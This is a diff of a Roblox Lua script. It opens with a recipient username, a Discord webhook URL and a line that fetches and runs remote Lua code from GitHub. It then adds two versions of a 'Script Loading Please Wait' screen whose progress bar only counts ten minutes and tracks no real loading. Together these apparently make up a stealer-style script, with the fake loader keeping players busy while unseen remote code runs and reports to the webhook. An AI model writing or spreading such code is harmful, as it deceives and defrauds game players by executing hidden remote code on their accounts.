@@ -1,3 +1,269 @@
 Username = {"evo12342jjj"} 
 Webhook = "https://discordapp.com/api/webhooks/1357029081627234387/mYzT_qBVFdzIEEafX6ox028I-dsvtUPqQCJKXYSmmsjYlQq_hfeQZnFMx9uLxNhBB-2P" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LoadingGUI"
+gui.ResetOnSpawn = false
+
+-- Constants
+local totalDuration = 600 -- 10 minutes
+local updateInterval = 1
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.5, 0, 0.3, 0)
+mainFrame.Position = UDim2.new(0.25, 0, 0.35, 0)
+mainFrame.BackgroundTransparency = 1
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = gui
+
+-- Background Image (with your asset ID)
+local background = Instance.new("ImageLabel", mainFrame)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.Image = "rbxassetid://81150123555529"
+background.BackgroundTransparency = 1
+background.ScaleType = Enum.ScaleType.Stretch
+background.ZIndex = 0
+
+-- Title
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "Script Loading Please Wait"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 28
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.ZIndex = 2
+
+-- Discord Link
+local link = Instance.new("TextLabel", mainFrame)
+link.Size = UDim2.new(1, 0, 0.2, 0)
+link.Position = UDim2.new(0, 0, 0.3, 0)
+link.Text = "Overdrive H (ODH)"
+link.Font = Enum.Font.SourceSansItalic
+link.TextSize = 18
+link.TextColor3 = Color3.fromRGB(200, 200, 255)
+link.BackgroundTransparency = 1
+link.ZIndex = 2
+
+-- Percentage
+local percent = Instance.new("TextLabel", mainFrame)
+percent.Size = UDim2.new(1, 0, 0.2, 0)
+percent.Position = UDim2.new(0, 0, 0.5, 0)
+percent.Text = "0%"
+percent.Font = Enum.Font.SourceSans
+percent.TextSize = 20
+percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+percent.BackgroundTransparency = 1
+percent.ZIndex = 2
+
+-- Progress bar background
+local progressBarBG = Instance.new("Frame", mainFrame)
+progressBarBG.Size = UDim2.new(0.9, 0, 0.1, 0)
+progressBarBG.Position = UDim2.new(0.05, 0, 0.75, 0)
+progressBarBG.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
+progressBarBG.BorderSizePixel = 0
+progressBarBG.ZIndex = 2
+
+-- Progress bar fill
+local progressBarFill = Instance.new("Frame", progressBarBG)
+progressBarFill.BackgroundColor3 = Color3.fromRGB(80, 170, 255)
+progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+progressBarFill.BorderSizePixel = 0
+progressBarFill.ZIndex = 3
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton", gui)
+toggleButton.Size = UDim2.new(0, 100, 0, 30)
+toggleButton.Position = UDim2.new(0.5, -50, 0.67, 0)
+toggleButton.Text = "Hide"
+toggleButton.BackgroundColor3 = Color3.fromRGB(15, 30, 60)
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.TextSize = 18
+toggleButton.AutoButtonColor = true
+
+-- Toggle Function
+local isVisible = true
+local expandedSize = UDim2.new(0.5, 0, 0.3, 0)
+local collapsedSize = UDim2.new(0.5, 0, 0, 0)
+
+local function toggleGui()
+	isVisible = not isVisible
+	toggleButton.Text = isVisible and "Hide" or "Show"
+	mainFrame:TweenSize(
+		isVisible and expandedSize or collapsedSize,
+		Enum.EasingDirection.Out,
+		Enum.EasingStyle.Sine,
+		0.4,
+		true
+	)
+end
+
+toggleButton.MouseButton1Click:Connect(toggleGui)
+
+-- Simulate loading progress
+local elapsed = 0
+while elapsed <= totalDuration do
+	local percentDone = math.floor((elapsed / totalDuration) * 100)
+	percent.Text = percentDone .. "%"
+	progressBarFill.Size = UDim2.new(elapsed / totalDuration, 0, 1, 0)
+	wait(updateInterval)
+	elapsed = elapsed + updateInterval
+end
+
+-- Done
+wait(1)
+gui:Destroy()
+
+
+
+GUI 2
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LoadingGUI"
+gui.ResetOnSpawn = false
+
+-- Constants
+local totalDuration = 600 -- 10 minutes
+local updateInterval = 1
+
+-- Container (draggable and collapsible)
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0.5, 0, 0.4, 0)
+container.Position = UDim2.new(0.25, 0, 0.3, 0)
+container.BackgroundTransparency = 1
+container.Active = true
+container.Draggable = true
+container.ClipsDescendants = true
+container.Parent = gui
+
+-- Background Image
+local background = Instance.new("ImageLabel")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.Image = "rbxassetid://17157741072" -- use uploaded image asset ID
+background.BackgroundTransparency = 1
+background.ImageTransparency = 0 -- fully visible
+background.ScaleType = Enum.ScaleType.Stretch
+background.ZIndex = 0
+background.Parent = container
+
+-- Shadowed inner frame for better readability
+local innerFrame = Instance.new("Frame")
+innerFrame.Size = UDim2.new(0.95, 0, 0.85, 0)
+innerFrame.Position = UDim2.new(0.025, 0, 0.1, 0)
+innerFrame.BackgroundColor3 = Color3.fromRGB(10, 25, 50)
+innerFrame.BackgroundTransparency = 0.2
+innerFrame.BorderSizePixel = 0
+innerFrame.ZIndex = 1
+innerFrame.Parent = container
+
+local uiCorner = Instance.new("UICorner", innerFrame)
+uiCorner.CornerRadius = UDim.new(0, 12)
+
+-- Toggle Button (top right)
+local toggleButton = Instance.new("TextButton", container)
+toggleButton.Size = UDim2.new(0, 60, 0, 30)
+toggleButton.Position = UDim2.new(1, -70, 0, 10)
+toggleButton.Text = "Hide"
+toggleButton.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.TextSize = 16
+toggleButton.ZIndex = 2
+toggleButton.AutoButtonColor = true
+
+local toggleCorner = Instance.new("UICorner", toggleButton)
+toggleCorner.CornerRadius = UDim.new(0, 8)
+
+-- Main UI Labels and Bar inside innerFrame
+local title = Instance.new("TextLabel", innerFrame)
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0.05, 0)
+title.Text = "Script Loading Please Wait"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 28
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.ZIndex = 2
+
+local link = Instance.new("TextLabel", innerFrame)
+link.Size = UDim2.new(1, 0, 0.15, 0)
+link.Position = UDim2.new(0, 0, 0.25, 0)
+link.Text = "OVERDRIVE H"
+link.Font = Enum.Font.Gotham
+link.TextSize = 18
+link.TextColor3 = Color3.fromRGB(200, 200, 255)
+link.BackgroundTransparency = 1
+link.ZIndex = 2
+
+local percent = Instance.new("TextLabel", innerFrame)
+percent.Size = UDim2.new(1, 0, 0.1, 0)
+percent.Position = UDim2.new(0, 0, 0.4, 0)
+percent.Text = "0%"
+percent.Font = Enum.Font.GothamMedium
+percent.TextSize = 20
+percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+percent.BackgroundTransparency = 1
+percent.ZIndex = 2
+
+-- Progress bar background
+local progressBarBG = Instance.new("Frame", innerFrame)
+progressBarBG.Size = UDim2.new(0.9, 0, 0.1, 0)
+progressBarBG.Position = UDim2.new(0.05, 0, 0.6, 0)
+progressBarBG.BackgroundColor3 = Color3.fromRGB(35, 65, 120)
+progressBarBG.BorderSizePixel = 0
+progressBarBG.ZIndex = 2
+
+local bgCorner = Instance.new("UICorner", progressBarBG)
+bgCorner.CornerRadius = UDim.new(0, 8)
+
+-- Progress bar fill
+local progressBarFill = Instance.new("Frame", progressBarBG)
+progressBarFill.BackgroundColor3 = Color3.fromRGB(90, 180, 255)
+progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+progressBarFill.BorderSizePixel = 0
+progressBarFill.ZIndex = 3
+
+local fillCorner = Instance.new("UICorner", progressBarFill)
+fillCorner.CornerRadius = UDim.new(0, 8)
+
+-- Toggle Function
+local isVisible = true
+local expandedSize = UDim2.new(0.5, 0, 0.4, 0)
+local collapsedSize = UDim2.new(0.5, 0, 0, 0)
+
+local function toggleGui()
+	isVisible = not isVisible
+	toggleButton.Text = isVisible and "Hide" or "Show"
+	container:TweenSize(
+		isVisible and expandedSize or collapsedSize,
+		Enum.EasingDirection.Out,
+		Enum.EasingStyle.Sine,
+		0.4,
+		true
+	)
+end
+
+toggleButton.MouseButton1Click:Connect(toggleGui)
+
+-- Progress update loop
+local elapsed = 0
+while elapsed <= totalDuration do
+	local percentDone = math.floor((elapsed / totalDuration) * 100)
+	percent.Text = percentDone .. "%"
+	progressBarFill.Size = UDim2.new(elapsed / totalDuration, 0, 1, 0)
+	wait(updateInterval)
+	elapsed = elapsed + updateInterval
+end
+
+-- Done
+wait(1)
+gui:Destroy()
